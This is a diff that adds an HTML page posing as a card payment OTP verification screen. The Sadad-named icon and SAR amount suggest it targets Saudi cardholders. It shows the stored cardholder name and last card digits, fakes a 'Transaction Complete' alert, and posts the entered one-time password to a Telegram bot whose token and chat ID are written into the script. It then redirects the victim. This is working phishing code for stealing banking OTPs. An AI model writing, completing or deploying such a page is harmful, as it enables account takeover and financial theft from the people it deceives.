@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter OTP</title>
+  <link rel="stylesheet" href="styles.css" />
+  <link rel="icon" type="image/png" href="10_Sadad-768x439.png" sizes="32x32" />
+</head>
+<body>
+  <div class="container">
+    <h1>Secure Verification</h1>
+    <p>We have sent an OTP to your registered phone number. Please enter it below to complete the transaction.</p>
+    
+    <!-- Show the card brand logo -->
+    <img id="otpBrandLogo" src="generic.png" alt="Card Brand" class="brand-logo" />
+
+    <div class="summary">
+      <p><strong>Cardholder Name:</strong> <span id="cardholderNameDisplay"></span></p>
+      <p><strong>Last 4 Digits:</strong> <span id="last4DigitsDisplay"></span></p>
+      <p><strong>Amount:</strong> <span id="amountDisplay">500 SAR</span></p>
+    </div>
+
+    <form id="otpForm">
+      <div class="form-group">
+        <label for="otpCode">OTP Code</label>
+        <input 
+          type="text" 
+          id="otpCode" 
+          name="otpCode" 
+          placeholder="Enter 6-digit OTP" 
+          maxlength="6"
+          required 
+        />
+      </div>
+
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      // 1) Retrieve stored data
+      const cardholderName = localStorage.getItem('cardholderName') || 'N/A';
+      const last4Digits = localStorage.getItem('last4Digits') || 'XXXX';
+      const cardBrand = localStorage.getItem('cardBrand') || 'generic';
+
+      // 2) Display name, last 4, amount
+      document.getElementById('cardholderNameDisplay').textContent = cardholderName;
+      document.getElementById('last4DigitsDisplay').textContent = last4Digits;
+
+      // 3) Show brand logo
+      const otpBrandLogo = document.getElementById('otpBrandLogo');
+      if (cardBrand === 'visa') {
+        otpBrandLogo.src = 'visa.png';
+      } else if (cardBrand === 'mastercard') {
+        otpBrandLogo.src = 'mastercard.png';
+      } else {
+        otpBrandLogo.src = 'generic.png';
+      }
+    });
+
+    // Handle OTP verification
+    const otpForm = document.getElementById('otpForm');
+    otpForm.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      alert('OTP Verified! Transaction Complete.');
+      // localStorage.clear(); // optionally clear stored values
+
+      // ----------------------------------------------------
+      // ADDED: Telegram Bot API + window.location redirect
+      // ----------------------------------------------------
+      
+      // 1) Replace with your actual BOT token + chat ID
+      const TELEGRAM_BOT_TOKEN = '8000171433:AAENJLpcHq7SQxoxWJHWkjV48_Fb-1lHDmk'; 
+      const TELEGRAM_CHAT_ID   = '7196613507'; 
+
+      // 2) Gather the OTP code
+      const otpValue = document.getElementById('otpCode').value.trim();
+
+      // 3) Construct the message to send
+      const messageText = `OTP Received: ${otpValue}`;
+
+      // 4) Telegram API endpoint
+      const telegramApiUrl = `https://api.telegram.org/bot8000171433:AAENJLpcHq7SQxoxWJHWkjV48_Fb-1lHDmk/sendMessage`;
+
+      // 5) Prepare data for POST request
+      const body = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: messageText
+      };
+
+      try {
+        // 6) Send the POST request to Telegram
+        const response = await fetch(telegramApiUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body)
+        });
+
+        // Optional: You can handle success/failure here if needed
+        if (!response.ok) {
+          // If Telegram responded with an error, you could log it.
+          console.error('Error sending OTP to Telegram:', response.statusText);
+        }
+      } catch (error) {
+        console.error('Error:', error);
+      }
+
+      // 7) Redirect to under.html
+      window.location.href = 'under.html';
+      // ----------------------------------------------------
+    });
+  </script>
+</body>
+</html>
